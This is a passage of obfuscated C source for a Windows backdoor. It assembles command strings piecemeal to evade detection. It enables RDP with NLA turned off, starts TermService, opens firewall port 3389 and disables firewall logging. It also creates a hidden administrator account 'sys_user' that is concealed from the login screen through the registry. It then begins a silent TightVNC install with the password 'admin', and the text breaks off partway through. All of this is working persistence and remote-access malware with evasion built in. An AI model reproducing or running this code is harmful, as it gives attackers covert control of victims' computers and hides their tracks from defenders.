	strcat(full_string_7, part_7_18);
	strcat(full_string_7, part_7_19);
	strcat(full_string_7, part_7_20);
	strcat(full_string_7, part_7_21);

    // Optionally disable NLA (set UserAuthentication to 0)
    if (set_key_reg_func(hKey, full_string_6, 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue)) != ERROR_SUCCESS) {
        //printf("Failed to set UserAuthentication.\n");
        close_key_reg_func(hKey);
        return;
    }
	// Set the fSingleSessionPerUser to 0 to allow multiple concurrent RDP sessions
    if (set_key_reg_func(hKey, full_string_7, 0, REG_DWORD, (const BYTE*)&dwValue, sizeof(dwValue)) != ERROR_SUCCESS) {
        //printf("Failed to set fSingleSessionPerUser.\n");
        close_key_reg_func(hKey);
        return;
    }

    close_key_reg_func(hKey);
    //printf("RDP enabled in the registry.\n");

    // Start the Terminal Services service
    SC_HANDLE hSCManager = open_SC_func(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL) {
		//printf("Failed to open Service Control Manage, error: %lu\n",GetLastError());
        return;
    }
	//printf("opened Service Control Manager.\n");
	
	char full_string_9[15];  //TermService
	char part_9_1[] = "T";
	char part_9_2[] = "e";
	char part_9_3[] = "r";
	char part_9_4[] = "m";
	char part_9_5[] = "S";
	char part_9_6[] = "e";
	char part_9_7[] = "r";
	char part_9_8[] = "v";
	char part_9_9[] = "i";
	char part_9_10[] = "c";
	char part_9_11[] = "e";
	strcpy(full_string_9, part_9_1);
	strcat(full_string_9, part_9_2);
	strcat(full_string_9, part_9_3);
	strcat(full_string_9, part_9_4);
	strcat(full_string_9, part_9_5);
	strcat(full_string_9, part_9_6);
	strcat(full_string_9, part_9_7);
	strcat(full_string_9, part_9_8);
	strcat(full_string_9, part_9_9);
	strcat(full_string_9, part_9_10);
	strcat(full_string_9, part_9_11);



    SC_HANDLE hService = open_service_func(hSCManager, full_string_9, SERVICE_START);
    if (hService == NULL) {
        //printf("Failed to open TermService.\n");
        CloseServiceHandle(hSCManager);
        return;
    }
	//printf("opened TermService.\n");

    if (!start_service_func(hService, 0, NULL)) {
        //printf("Failed to start TermService.\n");
    } else {
		//printf("TermService started successfully.\n");
    }

    close_service_func(hService);
    close_service_func(hSCManager);

    // Configure the firewall to allow RDP (port 3389)
    //printf("Configuring firewall to allow RDP...\n");
	
	
	//netsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389
	
	char full_string_1[110];	
	char part_1_1[] = "ne";
	char part_1_2[] = "t";
	char part_1_3[] = "sh ";
	char part_1_4[] = "adv";
	char part_1_5[] = "fi";
	char part_1_6[] = "re";
	char part_1_7[] = "wa";
	char part_1_8[] = "ll";
	char part_1_9[] = " fi";
	char part_1_10[] = "re";
	char part_1_11[] = "wa";
	char part_1_12[] = "ll";
	char part_1_13[] = " a";
	char part_1_14[] = "d";
	char part_1_15[] = "d r";
	char part_1_16[] = "ul";
	char part_1_17[] = "e na";
	char part_1_18[] = "me";
	char part_1_19[] = "=";
	char part_1_20[] = "\"O";
	char part_1_21[] = "pe";
	char part_1_22[] = "n P";
	char part_1_23[] = "or";
	char part_1_24[] = "t";
	char part_1_25[] = " 3";
	char part_1_26[] = "3";
	char part_1_27[] = "8";
	char part_1_28[] = "9\"";
	char part_1_29[] = " di";
	char part_1_30[] = "r=i";
	char part_1_31[] = "n ";
	char part_1_32[] = "ac";
	char part_1_33[] = "ti";
	char part_1_34[] = "on=";
	char part_1_35[] = "all";
	char part_1_36[] = "ow";	
	char part_1_37[] = " pr";
	char part_1_38[] = "ot";
	char part_1_39[] = "oc";
	char part_1_40[] = "ol=";
	char part_1_41[] = "T";
	char part_1_42[] = "C";
	char part_1_43[] = "P lo";
	char part_1_44[] = "ca";
	char part_1_45[] = "lpo";
	char part_1_46[] = "r";
	char part_1_47[] = "t=3";
	char part_1_48[] = "3";
	char part_1_49[] = "8";
	char part_1_50[] = "9";
	strcpy(full_string_1, part_1_1);
	strcat(full_string_1, part_1_2);
	strcat(full_string_1, part_1_3);
	strcat(full_string_1, part_1_4);
	strcat(full_string_1, part_1_5);
	strcat(full_string_1, part_1_6);
	strcat(full_string_1, part_1_7);
	strcat(full_string_1, part_1_8);
	strcat(full_string_1, part_1_9);
	strcat(full_string_1, part_1_10);
	strcat(full_string_1, part_1_11);
	strcat(full_string_1, part_1_12);
	strcat(full_string_1, part_1_13);
	strcat(full_string_1, part_1_14);
	strcat(full_string_1, part_1_15);
	strcat(full_string_1, part_1_16);
	strcat(full_string_1, part_1_17);
	strcat(full_string_1, part_1_18);
	strcat(full_string_1, part_1_19);
	strcat(full_string_1, part_1_20);
	strcat(full_string_1, part_1_21);
	strcat(full_string_1, part_1_22);
	strcat(full_string_1, part_1_23);
	strcat(full_string_1, part_1_24);
	strcat(full_string_1, part_1_25);
	strcat(full_string_1, part_1_26);
	strcat(full_string_1, part_1_27);
	strcat(full_string_1, part_1_28);
	strcat(full_string_1, part_1_29);
	strcat(full_string_1, part_1_30);
	strcat(full_string_1, part_1_31);
	strcat(full_string_1, part_1_32);
	strcat(full_string_1, part_1_33);
	strcat(full_string_1, part_1_34);
	strcat(full_string_1, part_1_35);
	strcat(full_string_1, part_1_36);
	strcat(full_string_1, part_1_37);
	strcat(full_string_1, part_1_38);
	strcat(full_string_1, part_1_39);
	strcat(full_string_1, part_1_40);
	strcat(full_string_1, part_1_41);
	strcat(full_string_1, part_1_42);
	strcat(full_string_1, part_1_43);
	strcat(full_string_1, part_1_44);
	strcat(full_string_1, part_1_45);
	strcat(full_string_1, part_1_46);
	strcat(full_string_1, part_1_47);
	strcat(full_string_1, part_1_48);
	strcat(full_string_1, part_1_49);
	strcat(full_string_1, part_1_50);
	
	
	
	// TODO -> disable firewall loggging
	
	//netsh advfirewall set allprofiles logging allowedconnections disable
	
	//netsh advfirewall set allprofiles logging droppedconnections disable
	char full_string_2[100];	
	char part_2_1[] = "n";	
	char part_2_2[] = "e";
	char part_2_3[] = "t";
	char part_2_4[] = "s";
	char part_2_5[] = "h";
	char part_2_6[] = " adv";
	char part_2_7[] = "fi";
	char part_2_8[] = "re";
	char part_2_9[] = "wa";
	char part_2_10[] = "ll s";
	char part_2_11[] = "et a";
	char part_2_12[] = "llp";
	char part_2_13[] = "rof";
	char part_2_14[] = "il";
	char part_2_15[] = "e";
	char part_2_16[] = "s lo";
	char part_2_17[] = "gg";
	char part_2_18[] = "i";
	char part_2_19[] = "ng";
	char part_2_20[] = " dr";
	char part_2_21[] = "op";
	char part_2_22[] = "pe";
	char part_2_23[] = "d";
	char part_2_24[] = "co";
	char part_2_25[] = "nn";
	char part_2_26[] = "e";
	char part_2_27[] = "ct";
	char part_2_28[] = "io";
	char part_2_29[] = "ns ";
	char part_2_30[] = "d";
	char part_2_31[] = "i";
	char part_2_32[] = "s";
	char part_2_33[] = "a";
	char part_2_34[] = "b";
	char part_2_35[] = "l";
	char part_2_36[] = "e";
	strcpy(full_string_2, part_2_1);
	strcat(full_string_2, part_2_2);
	strcat(full_string_2, part_2_3);
	strcat(full_string_2, part_2_4);
	strcat(full_string_2, part_2_5);
	strcat(full_string_2, part_2_6);
	strcat(full_string_2, part_2_7);
	strcat(full_string_2, part_2_8);
	strcat(full_string_2, part_2_9);
	strcat(full_string_2, part_2_10);
	strcat(full_string_2, part_2_11);
	strcat(full_string_2, part_2_12);
	strcat(full_string_2, part_2_13);
	strcat(full_string_2, part_2_14);
	strcat(full_string_2, part_2_15);
	strcat(full_string_2, part_2_16);
	strcat(full_string_2, part_2_17);
	strcat(full_string_2, part_2_18);
	strcat(full_string_2, part_2_19);
	strcat(full_string_2, part_2_20);
	strcat(full_string_2, part_2_21);
	strcat(full_string_2, part_2_22);
	strcat(full_string_2, part_2_23);
	strcat(full_string_2, part_2_24);
	strcat(full_string_2, part_2_25);
	strcat(full_string_2, part_2_26);
	strcat(full_string_2, part_2_27);
	strcat(full_string_2, part_2_28);
	strcat(full_string_2, part_2_29);
	strcat(full_string_2, part_2_30);
	strcat(full_string_2, part_2_31);
	strcat(full_string_2, part_2_32);
	strcat(full_string_2, part_2_33);
	strcat(full_string_2, part_2_34);
	strcat(full_string_2, part_2_35);
	strcat(full_string_2, part_2_36);
	
	//netsh advfirewall set allprofiles logging allowedconnections disable
	char full_string_3[100];	
	char part_3_1[] = "n";	
	char part_3_2[] = "e";
	char part_3_3[] = "t";
	char part_3_4[] = "s";
	char part_3_5[] = "h";
	char part_3_6[] = " adv";
	char part_3_7[] = "fi";
	char part_3_8[] = "re";
	char part_3_9[] = "wa";
	char part_3_10[] = "ll s";
	char part_3_11[] = "et a";
	char part_3_12[] = "llp";
	char part_3_13[] = "rof";
	char part_3_14[] = "il";
	char part_3_15[] = "e";
	char part_3_16[] = "s lo";
	char part_3_17[] = "gg";
	char part_3_18[] = "i";
	char part_3_19[] = "ng";
	char part_3_20[] = " all";
	char part_3_21[] = "ow";
	char part_3_22[] = "e";
	char part_3_23[] = "d";
	char part_3_24[] = "co";
	char part_3_25[] = "nn";
	char part_3_26[] = "e";
	char part_3_27[] = "ct";
	char part_3_28[] = "io";
	char part_3_29[] = "ns ";
	char part_3_30[] = "d";
	char part_3_31[] = "i";
	char part_3_32[] = "s";
	char part_3_33[] = "a";
	char part_3_34[] = "b";
	char part_3_35[] = "l";
	char part_3_36[] = "e";
	strcpy(full_string_3, part_3_1);
	strcat(full_string_3, part_3_2);
	strcat(full_string_3, part_3_3);
	strcat(full_string_3, part_3_4);
	strcat(full_string_3, part_3_5);
	strcat(full_string_3, part_3_6);
	strcat(full_string_3, part_3_7);
	strcat(full_string_3, part_3_8);
	strcat(full_string_3, part_3_9);
	strcat(full_string_3, part_3_10);
	strcat(full_string_3, part_3_11);
	strcat(full_string_3, part_3_12);
	strcat(full_string_3, part_3_13);
	strcat(full_string_3, part_3_14);
	strcat(full_string_3, part_3_15);
	strcat(full_string_3, part_3_16);
	strcat(full_string_3, part_3_17);
	strcat(full_string_3, part_3_18);
	strcat(full_string_3, part_3_19);
	strcat(full_string_3, part_3_20);
	strcat(full_string_3, part_3_21);
	strcat(full_string_3, part_3_22);	
	strcat(full_string_3, part_3_23);
	strcat(full_string_3, part_3_24);
	strcat(full_string_3, part_3_25);
	strcat(full_string_3, part_3_26);
	strcat(full_string_3, part_3_27);
	strcat(full_string_3, part_3_28);
	strcat(full_string_3, part_3_29);
	strcat(full_string_3, part_3_30);
	strcat(full_string_3, part_3_31);
	strcat(full_string_3, part_3_32);
	strcat(full_string_3, part_3_33);
	strcat(full_string_3, part_3_34);
	strcat(full_string_3, part_3_35);
	strcat(full_string_3, part_3_36);
	
	
	//printf("full_string_1 -> %s\nfull_string_2 -> %s\nfull_string_3 -> %s\n",full_string_1,full_string_2,full_string_3);
	/*
	system(full_string_1);
	system(full_string_2);
	system(full_string_3);
	*/
	
    int result_1 = system(full_string_1);
    int result_2 = system(full_string_2);
    int result_3 = system(full_string_3);
	if (result_1 == 0 && result_2 == 0 && result_3 == 0) {
        //printf("Firewall configured successfully.\n");
    } else {
        //printf("Failed to configure firewall.\n");
    }
}

void a66_Uz3_r(FARPROC cr_key_reg_func,FARPROC set_key_reg_func,FARPROC close_key_reg_func){
	
	
	//net user sys_user pwned /add && net localgroup Administrators sys_user /add
	char full_string_1[74];	
	char part_1_1[] = "ne";
	char part_1_2[] = "t ";
	char part_1_3[] = "us";
	char part_1_4[] = "e";
	char part_1_5[] = "r sys";
	char part_1_6[] = "_us";
	char part_1_7[] = "er p";
	char part_1_8[] = "wn";
	char part_1_9[] = "ed ";
	char part_1_10[] = "/a";
	char part_1_11[] = "d";
	char part_1_12[] = "d &";
	char part_1_13[] = "& n";
	char part_1_14[] = "et ";
	char part_1_15[] = "lo";
	char part_1_16[] = "c";
	char part_1_17[] = "al";
	char part_1_18[] = "gr";
	char part_1_19[] = "o";
	char part_1_20[] = "up ";
	char part_1_21[] = "A";
	char part_1_22[] = "d";
	char part_1_23[] = "mi";
	char part_1_24[] = "ni";
	char part_1_25[] = "str";
	char part_1_26[] = "at";
	char part_1_27[] = "or";
	char part_1_28[] = "s s";
	char part_1_29[] = "ys";
	char part_1_30[] = "_u";
	char part_1_31[] = "se";
	char part_1_32[] = "r /";
	char part_1_33[] = "a";
	char part_1_34[] = "d";
	char part_1_35[] = "d";
	strcpy(full_string_1, part_1_1);
	strcat(full_string_1, part_1_2);
	strcat(full_string_1, part_1_3);
	strcat(full_string_1, part_1_4);
	strcat(full_string_1, part_1_5);
	strcat(full_string_1, part_1_6);
	strcat(full_string_1, part_1_7);
	strcat(full_string_1, part_1_8);
	strcat(full_string_1, part_1_9);
	strcat(full_string_1, part_1_10);
	strcat(full_string_1, part_1_11);
	strcat(full_string_1, part_1_12);
	strcat(full_string_1, part_1_13);
	strcat(full_string_1, part_1_14);
	strcat(full_string_1, part_1_15);
	strcat(full_string_1, part_1_16);
	strcat(full_string_1, part_1_17);
	strcat(full_string_1, part_1_18);
	strcat(full_string_1, part_1_19);
	strcat(full_string_1, part_1_20);
	strcat(full_string_1, part_1_21);
	strcat(full_string_1, part_1_22);
	strcat(full_string_1, part_1_23);
	strcat(full_string_1, part_1_24);
	strcat(full_string_1, part_1_25);
	strcat(full_string_1, part_1_26);
	strcat(full_string_1, part_1_27);
	strcat(full_string_1, part_1_28);
	strcat(full_string_1, part_1_29);
	strcat(full_string_1, part_1_30);
	strcat(full_string_1, part_1_31);
	strcat(full_string_1, part_1_32);
	strcat(full_string_1, part_1_33);
	strcat(full_string_1, part_1_34);
	strcat(full_string_1, part_1_35);
	
	
	if (system(full_string_1) != 0){
		
		//printf("[x] Couldn't add new user, CMD -> %s\n",full_string_1);
		return;
	}

	//printf("[+] Added sys_user successfully\n");
	char full_string_2[70];	
	char part_2_1[] = "s";
	char part_2_2[] = "y";
	char part_2_3[] = "s";
	char part_2_4[] = "_";
	char part_2_5[] = "u";
	char part_2_6[] = "s";
	char part_2_7[] = "er";
	
	strcpy(full_string_2, part_2_1);
	strcat(full_string_2, part_2_2);
	strcat(full_string_2, part_2_3);
	strcat(full_string_2, part_2_4);
	strcat(full_string_2, part_2_5);
	strcat(full_string_2, part_2_6);
	strcat(full_string_2, part_2_7);
	
	
	// SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList
	char full_string_3[80];  
	char part_3_1[] = "S";
	char part_3_2[] = "O";
	char part_3_3[] = "F";
	char part_3_4[] = "T";
	char part_3_5[] = "W";
	char part_3_6[] = "A";
	char part_3_7[] = "R";
	char part_3_8[] = "E";
	char part_3_9[] = "\\";
	char part_3_10[] = "M";
	char part_3_11[] = "i";
	char part_3_12[] = "c";
	char part_3_13[] = "r";
	char part_3_14[] = "o";
	char part_3_15[] = "s";
	char part_3_16[] = "o";
	char part_3_17[] = "f";
	char part_3_18[] = "t";
	char part_3_19[] = "\\";
	char part_3_20[] = "W";
	char part_3_21[] = "in";
	char part_3_22[] = "d"; 
	char part_3_23[] = "ows";
	char part_3_24[] = " N";
	char part_3_25[] = "T\\";
	char part_3_26[] = "Cu";
	char part_3_27[] = "rr";
	char part_3_28[] = "en";
	char part_3_29[] = "t";
	char part_3_30[] = "V";
	char part_3_31[] = "er";
	char part_3_32[] = "s";
	char part_3_33[] = "io";
	char part_3_34[] = "n\\";
	char part_3_35[] = "Win";
	char part_3_36[] = "lo";
	char part_3_37[] = "go";
	char part_3_38[] = "n\\";
	char part_3_39[] = "S";
	char part_3_40[] = "p";
	char part_3_41[] = "e";
	char part_3_42[] = "c";
	char part_3_43[] = "i";
	char part_3_44[] = "a";
	char part_3_45[] = "l";
	char part_3_46[] = "A";
	char part_3_47[] = "cc";	
	char part_3_48[] = "o";	
	char part_3_49[] = "u";	
	char part_3_50[] = "n";	
	char part_3_51[] = "t";	
	char part_3_52[] = "s";	
	char part_3_53[] = "\\";	
	char part_3_54[] = "U";	
	char part_3_55[] = "s";	
	char part_3_56[] = "er";	
	char part_3_57[] = "L";	
	char part_3_58[] = "i";	
	char part_3_59[] = "st";	
	strcpy(full_string_3, part_3_1);
	strcat(full_string_3, part_3_2);
	strcat(full_string_3, part_3_3);
	strcat(full_string_3, part_3_4);
	strcat(full_string_3, part_3_5);
	strcat(full_string_3, part_3_6);
	strcat(full_string_3, part_3_7);
	strcat(full_string_3, part_3_8);
	strcat(full_string_3, part_3_9);
	strcat(full_string_3, part_3_10);
	strcat(full_string_3, part_3_11);
	strcat(full_string_3, part_3_12);
	strcat(full_string_3, part_3_13);
	strcat(full_string_3, part_3_14);
	strcat(full_string_3, part_3_15);
	strcat(full_string_3, part_3_16);
	strcat(full_string_3, part_3_17);
	strcat(full_string_3, part_3_18);
	strcat(full_string_3, part_3_19);
	strcat(full_string_3, part_3_20);
	strcat(full_string_3, part_3_21);
	strcat(full_string_3, part_3_22);
	strcat(full_string_3, part_3_23);
	strcat(full_string_3, part_3_24);
	strcat(full_string_3, part_3_25);
	strcat(full_string_3, part_3_26);
	strcat(full_string_3, part_3_27);
	strcat(full_string_3, part_3_28);
	strcat(full_string_3, part_3_29);
	strcat(full_string_3, part_3_30);
	strcat(full_string_3, part_3_31);
	strcat(full_string_3, part_3_32);
	strcat(full_string_3, part_3_33);
	strcat(full_string_3, part_3_34);
	strcat(full_string_3, part_3_35);
	strcat(full_string_3, part_3_36);
	strcat(full_string_3, part_3_37);
	strcat(full_string_3, part_3_38);
	strcat(full_string_3, part_3_39);
	strcat(full_string_3, part_3_40);
	strcat(full_string_3, part_3_41);
	strcat(full_string_3, part_3_42);
	strcat(full_string_3, part_3_43);
	strcat(full_string_3, part_3_44);
	strcat(full_string_3, part_3_45);
	strcat(full_string_3, part_3_46);
	strcat(full_string_3, part_3_47);
	strcat(full_string_3, part_3_48);
	strcat(full_string_3, part_3_49);
	strcat(full_string_3, part_3_50);
	strcat(full_string_3, part_3_51);
	strcat(full_string_3, part_3_52);
	strcat(full_string_3, part_3_53);
	strcat(full_string_3, part_3_54);
	strcat(full_string_3, part_3_55);
	strcat(full_string_3, part_3_56);
	strcat(full_string_3, part_3_57);
	strcat(full_string_3, part_3_58);
	strcat(full_string_3, part_3_59);
	
	HKEY hKey;
	DWORD dwValue = 0;
	LONG result = cr_key_reg_func(HKEY_LOCAL_MACHINE,full_string_3,&hKey);
	
    if (result != ERROR_SUCCESS) {
        //printf("Failed to open/create registry key. Error: %ld\n", result);
        return;
    }
    result = set_key_reg_func(hKey,full_string_2,0,REG_DWORD,(const BYTE*)&dwValue,sizeof(dwValue));
	
    if (result != ERROR_SUCCESS) {
        //printf("Failed to set registry value. Error: %ld\n", result);
        close_key_reg_func(hKey);
        return;
    }

    //printf("Successfully hid user '%s' from login screen.\n", full_string_2);
    close_key_reg_func(hKey);
	return;
}


void Vn_in(){
	
	
//msiexec /i "C:\Windows\Temp\SSS_ce1aaa99ce4bdb0101000000984b2414aa\tightVNC.msi" /quiet /norestart ADDLOCAL=Server SET_REMOVEWALLPAPER=0 VALUE_OF_REMOVEWALLPAPER=0 SET_USECONTROLAUTHENTICATION=1 VALUE_OF_USECONTROLAUTHENTICATION=1 SET_USEVNCAUTHENTICATION=1 VALUE_OF_USEVNCAUTHENTICATION=1 SET_CONTROLPASSWORD=1 VALUE_OF_CONTROLPASSWORD="admin" SET_PASSWORD=1 VALUE_OF_PASSWORD="admin" SET_VIEWONLYPASSWORD=1 VALUE_OF_VIEWONLYPASSWORD=viewpass
	char full_string_1[445];	
	char part_1_1[] = "m";
	char part_1_2[] = "s";
	char part_1_3[] = "i";
	char part_1_4[] = "e";
	char part_1_5[] = "x";
	char part_1_6[] = "e";
	char part_1_7[] = "c /";
	char part_1_8[] = "i";
	char part_1_9[] = " \"C";
	char part_1_10[] = ":";
	char part_1_11[] = "\\";
	char part_1_12[] = "Wi";
	char part_1_13[] = "nd";
	char part_1_14[] = "ow";
	char part_1_15[] = "s\\";
	char part_1_16[] = "T";
	char part_1_17[] = "e";
	char part_1_18[] = "mp\\";
	char part_1_19[] = "SSS";
	char part_1_20[] = "_";
	char part_1_21[] = "ce";
	char part_1_22[] = "1";
	char part_1_23[] = "aaa";
	char part_1_24[] = "99ce";
	char part_1_25[] = "4bdb";
	char part_1_26[] = "0101";
	char part_1_27[] = "000000";
	char part_1_28[] = "984b2414";
	char part_1_29[] = "aa\\";
	char part_1_30[] = "ti";
	char part_1_31[] = "g";
	char part_1_32[] = "h";
	char part_1_33[] = "t";
	char part_1_34[] = "V";
	char part_1_35[] = "N";
	char part_1_36[] = "C";
	char part_1_37[] = ".";
	char part_1_38[] = "m";
	char part_1_39[] = "s";
	char part_1_40[] = "i\" "; 
	char part_1_41[] = "/q";
	char part_1_42[] = "ui";
	char part_1_43[] = "e";
	char part_1_44[] = "t /";
	char part_1_45[] = "no";
	char part_1_46[] = "re";
	char part_1_47[] = "st";
	char part_1_48[] = "ar";
	char part_1_49[] = "t A";
	char part_1_50[] = "DD";
	char part_1_51[] = "LO";
	char part_1_52[] = "CA";
	char part_1_53[] = "L=S";
	char part_1_54[] = "erv";
	char part_1_55[] = "er";
	char part_1_56[] = " S";
	char part_1_57[] = "ET_";
	char part_1_58[] = "REM";
	char part_1_59[] = "OVE";
	char part_1_60[] = "WAL";
	char part_1_61[] = "LP";
	char part_1_62[] = "AP";
	char part_1_63[] = "ER=";
	char part_1_64[] = "0 ";
	char part_1_65[] = "VAL";
	char part_1_66[] = "UE_O";
	char part_1_67[] = "F_RE";
	char part_1_68[] = "MO";
	char part_1_69[] = "VE";
	char part_1_70[] = "WA";
	char part_1_71[] = "LL";
	char part_1_72[] = "PA";
	char part_1_73[] = "PER";
	char part_1_74[] = "=0";
	char part_1_75[] = " S"; 
	char part_1_76[] = "ET_";
	char part_1_77[] = "US";
	char part_1_78[] = "ECON";
	char part_1_79[] = "TROL";
	char part_1_80[] = "AU";
	char part_1_81[] = "TH";
	char part_1_82[] = "ENT";
	char part_1_83[] = "ICA";
	char part_1_84[] = "TION";
	char part_1_85[] = "=1 VAL";
	char part_1_86[] = "UE_OF_";
	char part_1_87[] = "US";
	char part_1_88[] = "ECON";
	char part_1_89[] = "TROL";
	char part_1_90[] = "AU";
	char part_1_91[] = "TH";
	char part_1_92[] = "ENT";
	char part_1_93[] = "ICA";
	char part_1_94[] = "TION";
	char part_1_95[] = "=1 ";
	char part_1_96[] = "SET_";
	char part_1_97[] = "USE";
	char part_1_98[] = "V";
	char part_1_99[] = "N";
	char part_1_100[] = "CAUT";
	char part_1_101[] = "H";
	char part_1_102[] = "EN";
	char part_1_103[] = "TI";
	char part_1_104[] = "CA";
	char part_1_105[] = "TI";
	char part_1_106[] = "ON=1";
	char part_1_107[] = " VAL";
	char part_1_108[] = "UE_";
	char part_1_109[] = "OF_US";
	char part_1_110[] = "EVN";
	char part_1_111[] = "CAUT";
	char part_1_112[] = "HENT";
	char part_1_113[] = "ICA";
	char part_1_114[] = "TIO";
	char part_1_115[] = "N=1 "; 
	char part_1_116[] = "SE";
	char part_1_117[] = "T_CON";
	char part_1_118[] = "TROL";
	char part_1_119[] = "PA";
	char part_1_120[] = "SS";
	char part_1_121[] = "WO";
	char part_1_122[] = "RD=1";
	char part_1_123[] = " VAL";
	char part_1_124[] = "UE_";
	char part_1_125[] = "OF_";
	char part_1_126[] = "CON";
	char part_1_127[] = "TROL";
	char part_1_128[] = "PA";
	char part_1_129[] = "SS";
	char part_1_130[] = "WO";
	char part_1_131[] = "RD=\"";
	char part_1_132[] = "ad";
	char part_1_133[] = "m";
	char part_1_134[] = "in\"";
	char part_1_135[] = " SE";
	char part_1_136[] = "T_P";
	char part_1_137[] = "A";
	char part_1_138[] = "SS";
	char part_1_139[] = "W";
	char part_1_140[] = "OR";
	char part_1_141[] = "D=1 ";
	char part_1_142[] = "VAL";
	char part_1_143[] = "UE_";
	char part_1_144[] = "OF_";
	char part_1_145[] = "P";
	char part_1_146[] = "ASS";
	char part_1_147[] = "W";
	char part_1_148[] = "O";
	char part_1_149[] = "R";
	char part_1_150[] = "D=\"";
	char part_1_151[] = "a";
	char part_1_152[] = "d";
	char part_1_153[] = "m";
	char part_1_154[] = "in\" ";
	char part_1_155[] = "SE";
	char part_1_156[] = "T_VI";
	char part_1_157[] = "EW";
	char part_1_158[] = "ON";
	char part_1_159[] = "LY";
	char part_1_160[] = "PA";
	char part_1_161[] = "SS";
	char part_1_162[] = "WO";
	char part_1_163[] = "RD";
	char part_1_164[] = "=1 ";
	char part_1_165[] = "VAL";
	char part_1_166[] = "UE_O";
	char part_1_167[] = "F";
	char part_1_168[] = "_VI";
	char part_1_169[] = "EW";
	char part_1_170[] = "ON";
	char part_1_171[] = "LY";
	char part_1_172[] = "P";
	char part_1_173[] = "A";
	char part_1_174[] = "SS";
	char part_1_175[] = "W";
	char part_1_176[] = "O";
	char part_1_177[] = "R";
	char part_1_178[] = "D";
	char part_1_179[] = "=";
	char part_1_180[] = "vi";
	char part_1_181[] = "ew";
	char part_1_182[] = "pa";
	char part_1_183[] = "ss";
	
	strcpy(full_string_1, part_1_1);
	strcat(full_string_1, part_1_2);
	strcat(full_string_1, part_1_3);
	strcat(full_string_1, part_1_4);
	strcat(full_string_1, part_1_5);
	strcat(full_string_1, part_1_6);
	strcat(full_string_1, part_1_7);
	strcat(full_string_1, part_1_8);
	strcat(full_string_1, part_1_9);
	strcat(full_string_1, part_1_10);
	strcat(full_string_1, part_1_11);
	strcat(full_string_1, part_1_12);
	strcat(full_string_1, part_1_13);
	strcat(full_string_1, part_1_14);
	strcat(full_string_1, part_1_15);
	strcat(full_string_1, part_1_16);
	strcat(full_string_1, part_1_17);
	strcat(full_string_1, part_1_18);
	strcat(full_string_1, part_1_19);
	strcat(full_string_1, part_1_20);
	strcat(full_string_1, part_1_21);
	strcat(full_string_1, part_1_22);
	strcat(full_string_1, part_1_23);
	strcat(full_string_1, part_1_24);
	strcat(full_string_1, part_1_25);
	strcat(full_string_1, part_1_26);
	strcat(full_string_1, part_1_27);
	strcat(full_string_1, part_1_28);
	strcat(full_string_1, part_1_29);
	strcat(full_string_1, part_1_30);
	strcat(full_string_1, part_1_31);
	strcat(full_string_1, part_1_32);
	strcat(full_string_1, part_1_33);
	strcat(full_string_1, part_1_34);
	strcat(full_string_1, part_1_35);
	strcat(full_string_1, part_1_36);
	strcat(full_string_1, part_1_37);
	strcat(full_string_1, part_1_38);
	strcat(full_string_1, part_1_39);
	strcat(full_string_1, part_1_40);
	strcat(full_string_1, part_1_41);
	strcat(full_string_1, part_1_42);
	strcat(full_string_1, part_1_43);
	strcat(full_string_1, part_1_44);
	strcat(full_string_1, part_1_45);
	strcat(full_string_1, part_1_46);
	strcat(full_string_1, part_1_47);
	strcat(full_string_1, part_1_48);
	strcat(full_string_1, part_1_49);
	strcat(full_string_1, part_1_50);
	strcat(full_string_1, part_1_51);
	strcat(full_string_1, part_1_52);
	strcat(full_string_1, part_1_53);
	strcat(full_string_1, part_1_54);
	strcat(full_string_1, part_1_55);
	strcat(full_string_1, part_1_56);
	strcat(full_string_1, part_1_57);
	strcat(full_string_1, part_1_58);
	strcat(full_string_1, part_1_59);
	strcat(full_string_1, part_1_60);
	strcat(full_string_1, part_1_61);
	strcat(full_string_1, part_1_62);
	strcat(full_string_1, part_1_63);
	strcat(full_string_1, part_1_64);
	strcat(full_string_1, part_1_65);
	strcat(full_string_1, part_1_66);
	strcat(full_string_1, part_1_67);
	strcat(full_string_1, part_1_68);
	strcat(full_string_1, part_1_69);
	strcat(full_string_1, part_1_70);
	strcat(full_string_1, part_1_71);
	strcat(full_string_1, part_1_72);
	strcat(full_string_1, part_1_73);
	strcat(full_string_1, part_1_74);
	strcat(full_string_1, part_1_75);
	strcat(full_string_1, part_1_76);
	strcat(full_string_1, part_1_77);
	strcat(full_string_1, part_1_78);
	strcat(full_string_1, part_1_79);
	strcat(full_string_1, part_1_80);
	strcat(full_string_1, part_1_81);
	strcat(full_string_1, part_1_82);
	strcat(full_string_1, part_1_83);
	strcat(full_string_1, part_1_84);
	strcat(full_string_1, part_1_85);
	strcat(full_string_1, part_1_86);
	strcat(full_string_1, part_1_87);
	strcat(full_string_1, part_1_88);
	strcat(full_string_1, part_1_89);
	strcat(full_string_1, part_1_90);
	strcat(full_string_1, part_1_91);
	strcat(full_string_1, part_1_92);
	strcat(full_string_1, part_1_93);
	strcat(full_string_1, part_1_94);
	strcat(full_string_1, part_1_95);
	strcat(full_string_1, part_1_96);
	strcat(full_string_1, part_1_97);
	strcat(full_string_1, part_1_98);
	strcat(full_string_1, part_1_99);
	strcat(full_string_1, part_1_100);
	strcat(full_string_1, part_1_101);
	strcat(full_string_1, part_1_102);
	strcat(full_string_1, part_1_103);
	strcat(full_string_1, part_1_104);
	strcat(full_string_1, part_1_105);
	strcat(full_string_1, part_1_106);
	strcat(full_string_1, part_1_107);
	strcat(full_string_1, part_1_108);
	strcat(full_string_1, part_1_109);
	strcat(full_string_1, part_1_110);
	strcat(full_string_1, part_1_111);
	strcat(full_string_1, part_1_112);
	strcat(full_string_1, part_1_113);
	strcat(full_string_1, part_1_114);
	strcat(full_string_1, part_1_115);
	strcat(full_string_1, part_1_116);
	strcat(full_string_1, part_1_117);
	strcat(full_string_1, part_1_118);
	strcat(full_string_1, part_1_119);
	strcat(full_string_1, part_1_120);
	strcat(full_string_1, part_1_121);
	strcat(full_string_1, part_1_122);
	strcat(full_string_1, part_1_123);
	strcat(full_string_1, part_1_124);
	strcat(full_string_1, part_1_125);
	strcat(full_string_1, part_1_126);
	strcat(full_string_1, part_1_127);
	strcat(full_string_1, part_1_128);
	strcat(full_string_1, part_1_129);
	strcat(full_string_1, part_1_130);
	strcat(full_string_1, part_1_131);
	strcat(full_string_1, part_1_132);
	strcat(full_string_1, part_1_133);
